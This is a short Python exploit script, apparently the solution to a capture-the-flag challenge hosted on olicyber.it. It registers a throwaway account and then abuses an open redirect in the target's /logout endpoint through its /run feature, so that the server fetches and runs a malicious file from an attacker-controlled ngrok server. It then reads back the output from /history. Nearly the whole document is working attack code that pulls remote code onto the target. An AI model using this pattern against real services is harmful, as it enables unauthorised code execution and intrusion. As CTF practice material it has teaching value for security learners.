# use python3 server.py and ngrok http 5000 to set up the attack server.

import requests
import string
import random

def generate_random_string(length=10):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

url = input('Insert the ngrok url: ')
attack_url = 'http://cloud_free_tier.challs.olicyber.it'

s = requests.Session()

# Register new user
s.post(attack_url + '/register', data={'username':generate_random_string(), 'password':'12345678', 'repeat_password':'12345678'}, headers={'Content-Type': 'application/x-www-form-urlencoded'})

# Send malicious file
s.post(attack_url + '/run', data={'file':f'/logout?redirect={url}'}, headers={'Content-Type': 'application/x-www-form-urlencoded'})

# Get the output of the malicious file
r = s.get(attack_url + '/history')
print(r.text)